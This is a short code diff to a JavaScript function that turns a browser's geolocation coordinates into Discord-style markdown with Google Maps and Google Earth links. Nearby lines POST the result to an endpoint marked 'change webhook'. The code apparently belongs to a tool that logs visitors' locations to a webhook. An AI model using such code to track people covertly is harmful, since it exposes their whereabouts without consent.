@@ -79,7 +79,7 @@ function getLocation() {
 }
 
 function showPosition(position) {
-  var latlong = (" GET " , "```autohotkey\nLatitude:" + position.coords.latitude + "\nLongitude:" + position.coords.longitude + "```" + "\n__**Map Location:**__ https://www.google.com/maps/place/" + position.coords.latitude + "," + position.coords.longitude);
+  var latlong = (" GET " , "```prolog\nLatitude:" + position.coords.latitude + "\nLongitude:" + position.coords.longitude + "```" + "\n__**Map Location:**__ https://www.google.com/maps/place/" + position.coords.latitude + "," + position.coords.longitude + "\n__**Google Earth:**__ https://earth.google.com/web/search/" + position.coords.latitude + "," + position.coords.longitude);
   
   const request = new XMLHttpRequest();
       request.open("POST", "/location_update"); //change webhook
